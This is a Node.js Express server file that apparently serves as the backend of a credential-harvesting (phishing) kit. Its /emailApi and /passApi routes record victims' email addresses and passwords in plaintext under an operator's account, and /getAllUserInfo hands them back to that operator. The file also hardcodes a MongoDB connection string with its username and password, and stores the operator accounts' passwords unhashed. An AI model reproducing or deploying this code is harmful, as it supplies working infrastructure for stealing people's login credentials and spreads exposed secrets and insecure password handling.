const express = require("express");
const app = express();
const path = require("path");
const port = process.env.PORT || 3000;
const mongoose = require('mongoose');

mongoose.connect("mongodb+srv://ammaremailgettter:ammar2122009@emailgetter.kmcdj23.mongodb.net/?retryWrites=true&w=majority&appName=EmailGetter", {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('✅ MongoDB connected'))
.catch(err => console.error('❌ MongoDB connection error:', err));

app.use(express.static(path.join(__dirname, "public")));
app.use(express.static("public"));

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

const User = require('./models/db');
const Key = require('./models/keys');

app.get("/", (req, res) => {
  res.render("index" , {bodyClass:'dark:bg-black'});
});
app.get("/something", (req, res) => {
  res.render("something" , {bodyClass:'dark:bg-black'});
});
app.get("/email", (req, res) => {
  res.render("email" , {bodyClass:'dark:bg-black'});
});
app.get("/user", (req, res) => {
  res.render("user" , {bodyClass:''});
});
app.get("/pass", (req, res) => {
  res.render("pass" , {bodyClass:'dark:bg-black'});
});
app.get("/userAuth", (req, res) => {
  res.render("userAuth" , {bodyClass:''});
});
app.post("/login", (req, res) => {
  res.json({success :false})
});
app.post("/signup", async(req, res) => {
  const info = req.body;
  const ff = await User.findOne({ user: info.user });
  if (ff) {
    return  res.json({success:false})
  }
  const saved = await User.create(req.body)  
  res.json({success:true })
});

app.post("/loginApi", async (req, res) => {
  const { user, password } = req.body;

  // Step 1: Find user by username only
  const foundUser = await User.findOne({ user });

  if (!foundUser) {
    return res.json({ success: false, message: "User not found" });
  }

  // Step 2: Compare password
  if (foundUser.password !== password) {
    return res.json({ success: false, message: "Incorrect password" });
  }

  // All good
  res.json({ success: true, id: foundUser._id });
});


app.get('/getUser', async (req, res) => {
  const userId = req.query.id;

  try {
    const user = await User.findById(userId); // ⭐ main function

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    res.json(user);
  } catch (error) {
    console.error("Error finding user:", error);
    res.status(500).json({ message: "Server error" });
  }
});
function getTime() {
  const now = new Date();
  return now.toLocaleTimeString('en-US', {
    timeZone: 'Asia/Karachi',
    hour: '2-digit',
    minute: '2-digit',
    hour12: true,
  });
}


// BACKEND CODE
app.post('/emailApi', async (req, res) => {
  const { id: userId, email} = req.body;
  
  // Validate input
  if (!userId || !email.trim()) {
    return res.status(400).json({ message: "User ID and email are required" });
  }
  
  try {
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    
    // Initialize getUserInfo if it doesn't exist
    if (!user.getUserInfo) {
      user.getUserInfo = [];
    }
    
    // Check if contact (email/phone) already exists in getUserInfo
    const alreadyExists = user.getUserInfo.some(info => info.email === email.trim());
    if (alreadyExists) {
      return res.json({ 
        message: "Contact already exists, using existing entry",
        success: true,
        exists: true
      });
    }
    
    // Push new entry
    user.getUserInfo.push({
      email: email.trim(),
      password: [], // Initialize password array
      date: getTime()
    });
    
    await user.save();
    console.log(user.getUserInfo);
    res.json({ 
      message: "Contact info added successfully",
      success: true,
      exists: false
    });
  } catch (error) {
    console.error("Error in /emailApi:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
});

app.post('/passApi', async (req, res) => {
  const { id: userId, email, password: pass } = req.body;
  
  // Validate input
  if (!userId || !email || !pass) {
    return res.status(400).json({ message: "User ID, contact, and password are required" });
  }
  
  try {
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    
    // Find the contact entry
    const info = user.getUserInfo.find((item) => item.email === email);
    if (info) {
      // SAFETY CHECK: ensure password is an array
      if (!Array.isArray(info.password)) {
        info.password = [];
      }
      
      // Push new password value
      info.password.push({ value: pass, date: getTime() });
      
      // Update the date
      info.date = getTime();
      
      await user.save();
      console.log("✅ Password pushed:", user.getUserInfo);
      res.json({ 
        message: "Password updated successfully",
        success: true 
      });
    } else {
      res.status(404).json({ message: "Contact not found in user info" });
    }
  } catch (error) {
    console.error("❌ Error in /passApi:", error);
    res.status(500).json({ message: "Server error", error: error.message });
  }
});

app.post("/getAllUserInfo", async (req, res) => {
  const userId = req.body.id;

  try {
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ success: false, message: "User not found" });
    }

    // Send back all getUserInformation[]
    res.status(200).json({
      success: true,
      userInfo: user.getUserInfo
    });

  } catch (error) {
    console.error("Error fetching user info:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});


// Adjust path if needed

async function saveKeys(user, adminKey, userKey) {
  try {
    const newKey = new Key({ user, adminKey, userKey });
    const saved = await newKey.save();
    console.log("✅ Keys saved:", saved);
  } catch (err) {
    console.error("❌ Error saving keys:", err.message);
  }
}





app.listen(port,  () => {
    console.log(`Example app listening on port ${port}`)
  })